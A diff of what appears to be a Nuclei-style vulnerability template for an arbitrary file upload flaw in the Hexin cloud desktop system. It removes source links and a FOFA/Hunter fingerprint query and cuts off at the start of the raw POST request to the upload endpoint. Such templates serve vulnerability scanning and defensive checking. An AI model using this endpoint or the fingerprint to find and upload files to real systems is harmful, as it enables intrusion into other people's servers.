@@ -3,14 +3,8 @@ info:
   name: 和信创天云桌面系统upload_file存在任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ace82925464e218d86fb9dab0f268e55
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ace82925464e218d86fb9dab0f268e55
-    fofa: + hunter`web.body="和信下一代云桌面"`
 http:
 - raw:
   - 'POST /Upload/upload_file.php?l=1 HTTP/1.1
